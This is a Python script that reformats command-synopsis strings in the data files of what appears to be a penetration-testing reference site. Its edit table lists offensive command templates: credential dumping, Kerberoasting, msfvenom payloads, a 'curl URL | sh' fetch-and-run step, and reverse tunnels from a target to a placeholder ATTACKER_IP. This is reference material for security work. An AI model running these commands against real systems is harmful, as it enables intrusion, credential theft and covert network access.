#!/usr/bin/env python3
"""ZothPen snippet fixer.

Rewrites the command/notation strings the auditor flagged:
  1. synopsis lines (syn/syntax) -> placeholders become UPPER tokens, "or"
     alternatives get one line each, prose glued with | is dropped. A <word>
     in a shell block reads as a redirect and makes the whole line unparseable;
     UPPER is the man-page convention and stays copy-pasteable.
  2. trailing whitespace inside every command-ish string value.
  3. two needlessly split commands -> one line.

Every edit is anchored on a unique substring *inside the current value*, so a
failed anchor means the file changed and nothing is written.  Run with no
argument for a dry run; pass --apply to write.

usage: python3 tools/fix_snippets.py [--apply]
"""
import glob
import os
import re
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FILES = sorted(glob.glob(os.path.join(ROOT, "assets", "data-*.js")))

# (anchor inside the current value, field, new value)
SYNOPSIS = [
    # ---- console index: ZX ------------------------------------------------
    ("-n <target>", "syn", "nmap -sS -p- --min-rate 2000 -n TARGET"),
    ("-oL out.lst <cidr>", "syn", "sudo masscan -p1-65535 --rate 5000 -oL out.lst CIDR"),
    ("nxc <proto> <target>", "syn", "nxc PROTO TARGET -u USER -p PASS ACTION"),
    ("enum4linux-ng -A <host>", "syn", "enum4linux-ng -A HOST"),
    ("ldap://<dc>", "syn",
     'ldapsearch -x -H ldap://DC -D "USER@DOMAIN" -w PASS -b "BASE_DN" "FILTER" ATTRS'),
    ("-ns <dc-ip> -c All", "syn",
     "bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c All"),
    ("dig @<resolver>", "syn", "dig @RESOLVER NAME TYPE +short"),
    ("searchsploit <term>", "syn",
     "searchsploit TERM\nsearchsploit --nmap scan.xml\nsearchsploit -m EDB_ID"),
    ("ffuf -w <wordlist>", "syn",
     "ffuf -w WORDLIST -u https://HOST/FUZZ -t 40 -rate RATE -fc CODES"),
    ("msfvenom -p <payload>", "syn",
     "msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT -o FILE"),
    ("evil-winrm -i <host>", "syn",
     "evil-winrm -i HOST -u USER -p PASS\nevil-winrm -i HOST -u USER -H NT_HASH"),
    ("john --wordlist=<list>", "syn",
     "john --wordlist=WORDLIST --format=FORMAT HASHFILE"),
    ("pass.txt <service>", "syn",
     "hydra -L users.txt -P pass.txt SERVICE://TARGET -t THREADS -f"),
    ("impacket-secretsdump <domain>", "syn",
     "impacket-secretsdump DOMAIN/USER:PASS@HOST"),
    ("<dc> <domain>/<user>:<pass>", "syn",
     "impacket-GetUserSPNs -dc-ip DC DOMAIN/USER:PASS -request -outputfile kerb.txt"),
    ("-u <user>@<domain> -p <pass> -dc-ip <dc>", "syn",
     "certipy-ad find -u USER@DOMAIN -p PASS -dc-ip DC -vulnerable -stdout"),
    ("curl -L <url> | sh", "syn",
     "curl -L URL | sh          # or copy it over, chmod +x, then run"),
    ("--bind <your-ip>", "syn", "python3 -m http.server 80 --bind YOUR_IP"),
    ("-p 445 <internal-ip>", "syn",
     "proxychains4 -f px.conf nmap -sT -Pn -p 445 INTERNAL_IP"),
    # ---- tool dossiers: ZT ------------------------------------------------
    ("nxc <protocol> <targets>", "syntax",
     "nxc PROTOCOL TARGET -u USER -p PASS ACTION [options]"),
    ("burpsuite   (GUI)", "syntax",
     "burpsuite                  # GUI; proxy listens on 127.0.0.1:8080"),
    ("SharpHound.exe -c All  |", "syntax",
     "SharpHound.exe -c All --zipfilename lab.zip\n"
     "bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c All"),
    ("gtfobins.github.io/  |", "syntax",
     "https://gtfobins.github.io/    # search by binary name or by capability"),
    ("whois DOMAIN | whois IP", "syntax",
     "whois DOMAIN\nrdap DOMAIN                    # same data as structured JSON\n"
     "whois -h whois.arin.net '!NET-1.2.3.0'"),
    ("smbclient -L //HOST -N | smbclient", "syntax",
     "smbclient -L //HOST -N\nsmbclient //HOST/SHARE -U HOST/USER\n"
     "smbclient.py USER:PASS@HOST    # impacket"),
    ("recon-ng  \u2192  marketplace search", "syntax",
     "recon-ng -w lab            # then, at the recon-ng prompt:\n"
     "marketplace install all\nrun recon/domains-hosts/hackertarget"),
    # ---- attacker/target pairs: one real command per line ----------------
    ("# attacker: ./proxy -selfcert", "syn",
     "# attacker\n./proxy -selfcert -laddr 0.0.0.0:11601\n"
     "# target\n./agent -connect ATTACKER_IP:11601 -ignore-cert"),
    ("# server (attacker): ./chisel server", "syn",
     "# attacker\n./chisel server -p 8080 --reverse\n"
     "# target\n./chisel client ATTACKER_IP:8080 R:socks"),
    # ---- needlessly split across lines ------------------------------------
    ("-p <param>", "syn", "sqlmap -r request.txt -p PARAM --batch --level 2 --risk 1"),
    ("-t <dir|tag>", "syn",
     "nuclei -u https://HOST -t TAG -severity critical,high -o out.txt"),
    ("-m <mode>", "syn",
     "hashcat -m MODE hashes.txt wordlist.txt -r rules/best64.rule"),
    ('"<pattern>"', "syn", 'grep -oE "PATTERN" file | sort -u'),
    ("certipy-ad find -u user@domain", "syntax",
     "certipy-ad find -u USER@DOMAIN -p PASS -dc-ip DC -vulnerable\n"
     "certipy-ad req / auth / relay      # request, authenticate, relay"),
    ("then: sudo ip route add", "cmd",
     "sudo ip tuntap add user $(whoami) mode tun ligolo\n"
     "sudo ip link set ligolo up\n"
     "# ligolo proxy console:  session  ->  ifconfig\n"
     "sudo ip route add 10.10.10.0/24 dev ligolo"),
    ("proxy > session > 1", "cmd",
     "# at the ligolo proxy prompt:\n"
     "session                    # pick the agent by number\n"
     "ifconfig                   # networks the agent can see\n"
     "start                      # bring the tunnel up"),
]

# strings that are code, not prose: strip whitespace at end of every line
CODE_KEYS = ("cmd", "syn", "syntax", "code", "run", "script")
STR = re.compile(r"\b(cmd|syn|syntax|code|run|script):'((?:[^'\\]|\\.)*)'")


def jsq(s):
    """encode a python string as the inside of a JS single-quoted literal"""
    out = []
    for ch in s:
        if ch == "\\":
            out.append("\\\\")
        elif ch == "'":
            out.append("\\'")
        elif ch == "\n":
            out.append("\\n")
        elif ch == "\r":
            out.append("\\r")
        else:
            out.append(ch)
    return "".join(out)


def unjsq(s):
    return re.sub(r"\\(.)", lambda m: {"n": "\n", "t": "\t", "r": "\r"}.get(m.group(1), m.group(1)), s)


def find_value(txt, anchor, key):
    """locate key:'...' whose value contains anchor; return (start, end)"""
    i = txt.index(anchor)
    ks = txt.rindex(key + ":'", 0, i + len(anchor))
    j = ks + len(key) + 2
    k = j
    while True:
        if txt[k] == "\\":
            k += 2
            continue
        if txt[k] == "'":
            break
        k += 1
    return j, k


def main():
    apply = "--apply" in sys.argv
    repair = "--repair" in sys.argv
    texts = {f: open(f, encoding="utf-8").read() for f in FILES}
    edits = 0
    print("== value edits ==")
    for anchor, key, new in ([] if repair else SYNOPSIS):
        hits = [f for f, t in texts.items() if anchor in t]
        if len(hits) != 1:
            # idempotency: if the target text is already in place there is
            # nothing to do (the anchor was consumed by an earlier apply)
            esc = jsq(new)
            if any(esc in t or new in t for t in texts.values()):
                print("-- already applied: %r" % (new.split("\n")[0][:52],))
                continue
            print("!! anchor %r matched %d files: %s" % (anchor, len(hits), hits))
            return 1
        f = hits[0]
        t = texts[f]
        if t.count(anchor) != 1:
            print("!! anchor %r appears %d times in %s" % (anchor, t.count(anchor), f))
            return 1
        j, k = find_value(t, anchor, key)
        old = unjsq(t[j:k])
        if old.split("\n")[0].strip() != anchor.strip() and anchor not in old:
            print("!! anchor %r not inside the value found in %s" % (anchor, f))
            return 1
        texts[f] = t[:j] + jsq(new) + t[k:]
        edits += 1
        print("\n%s  [%s]" % (os.path.basename(f), key))
        for ln in old.split("\n"):
            print("   - " + ln)
        for ln in new.split("\n"):
            print("   + " + ln)

    print("\n== trailing whitespace ==")
    for f in FILES:
        t = texts[f]
        n = [0]

        def fix(m):
            # a JS single-quoted literal cannot hold a real newline: escape any
            # stray one, and strip end-of-line whitespace
            body = m.group(2).replace("\n", "\\n")
            stripped = "\\n".join(ln.rstrip() for ln in body.split("\\n"))
            if stripped != m.group(2):
                n[0] += 1
            return m.group(1) + ":'" + stripped + "'"

        texts[f] = STR.sub(fix, t)
        if n[0]:
            print("   %s: %d value(s) trimmed" % (os.path.basename(f), n[0]))
            edits += n[0]

    if apply:
        for f, t in texts.items():
            open(f, "w", encoding="utf-8").write(t)
        print("\nAPPLIED %d edits across %d files" % (edits, len(FILES)))
    else:
        print("\nDRY RUN: %d edits would be applied (re-run with --apply)" % edits)
    return 0


if __name__ == "__main__":
    sys.exit(main())
